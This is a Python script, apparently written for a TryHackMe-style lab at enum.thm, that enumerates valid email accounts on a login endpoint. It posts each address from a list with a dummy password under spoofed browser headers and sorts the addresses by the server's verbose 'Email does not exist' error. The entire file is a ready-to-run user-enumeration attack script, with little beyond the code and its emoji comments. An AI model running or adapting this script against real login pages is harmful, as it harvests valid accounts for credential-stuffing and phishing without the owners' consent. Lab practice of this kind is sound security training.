import requests
from requests.models import Response # 🎩 Importing the Class
import sys
from typing import Dict, Any, List

def check_email(email: str) -> Dict[str, Any]:
    """
    🕵️‍♂️ The Detective Function
    Sends a request to the server to check if an email exists.
    It pretends to be a browser trying to log in! 🎭
    """
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # 📍 Target URL
    
    # 🎭 The Disguise (Headers)
    # We look like a Firefox browser on Linux.
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    
    # 📦 The Payload
    # Sending the email with a dummy password.
    data = {
        'username': email,
        'password': 'password',  # 🔑 Random password (we only care about the username)
        'function': 'login'
    }

    # 🚀 Send the Post Request!
    # Explicitly telling Python: "This variable IS a Response object"
    server_reply: Response = requests.post(url, headers=headers, data=data)
    
    # We unbox the JSON into a Dictionary 📖
    return server_reply.json()

def enumerate_emails(email_file: str) -> List[str]:
    """
    📋 The List Processor
    Reads a file line-by-line and sends the Detective to check each one.
    """
    valid_emails = []
    # 🚫 The string that tells us "Nope, not here"
    invalid_error = "Email does not exist"

    # 📂 Open the file
    with open(email_file, 'r') as file:
        emails = file.readlines()

    # 🔄 Loop through every email
    for email in emails:
        email = email.strip()  # ✂️ Trim whitespace
        if email:
            response_json = check_email(email)
            
            # 🧐 Check the verdict
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"❌ [INVALID] {email}")
            else:
                # 🎉 Found one!
                print(f"✅ [VALID]   {email}")
                valid_emails.append(email)

    return valid_emails

# 🎬 Main Entry Point
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    print("🚀 Starting Enumeration...")
    valid_emails = enumerate_emails(email_file)

    print("\n🎉 Valid emails found:")
    for valid_email in valid_emails:
        print(valid_email)